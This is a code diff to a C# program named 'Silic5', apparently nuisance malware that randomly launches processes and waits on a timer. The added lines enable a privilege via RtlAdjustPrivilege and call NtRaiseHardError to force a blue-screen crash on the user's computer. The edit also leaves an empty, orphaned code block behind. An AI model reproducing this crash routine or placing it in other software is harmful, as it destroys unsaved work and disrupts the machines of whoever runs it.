@@ -38,9 +38,13 @@ namespace Silic5
                 else if (count == 400) { extreme = true; }
                 if (count > 380 && rand.Next(10) == 1) { Process.Start(process[rand.Next(process.Length)]); }
                 Thread.Sleep(173000);
-                if (!ShutdownHelper.ForceShutdownComputer()) //made by Sky (C++ to C#)
+                Console.Beep(1000, 2000);
+                Boolean t1;
+                uint t2;
+                Dll_Imports.RtlAdjustPrivilege(19, true, false, out t1);
+                Dll_Imports.NtRaiseHardError(0xfDEAD666, 0, 0, IntPtr.Zero, 6, out t2);
+                Environment.Exit(-1);
                 {
-                    Environment.Exit(-1); //added BSOD fallback if ntdll call is not supported
                 }
             }
         }
